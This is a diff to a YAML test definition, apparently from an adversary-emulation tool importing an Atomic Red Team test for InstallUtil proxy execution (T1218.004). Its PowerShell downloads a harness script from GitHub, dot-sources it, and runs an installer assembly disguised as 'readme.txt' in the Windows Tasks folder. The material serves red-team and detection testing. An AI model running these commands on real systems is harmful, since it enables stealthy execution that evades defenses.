@@ -9,7 +9,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.004
-    name: 'Signed Binary Proxy Execution: InstallUtil'
+    name: 'System Binary Proxy Execution: InstallUtil'
   platforms:
     windows:
       psh:
@@ -17,8 +17,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1") -ErrorAction
           ignore | Out-Null; Invoke-WebRequest ''https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1''
-          -OutFile "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1";
-          fi; # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;
+          -OutFile "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"
+          -UseBasicParsing; fi; # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;
           . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"; $InstallerAssemblyDir
           = "$Env:windir\System32\Tasks"; $InstallerAssemblyFileName = ''readme.txt'';
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath
@@ -45,9 +45,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - stealth
   - t1218.004
   - atomic-red-team
-  - stealth
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -67,9 +67,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest ''https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1''
-        -OutFile "#{test_harness}"
+        -OutFile "#{test_harness}" -UseBasicParsing
 
         '
     technique_created: '2020-01-23T19:09:48.811Z'
     atomic_guid: 559e6d06-bb42-4307-bff7-3b95a8254bad
-    import_timestamp: '2026-10-20T07:08:26.413556Z'
+    import_timestamp: '2026-10-21T07:01:49.206061Z'
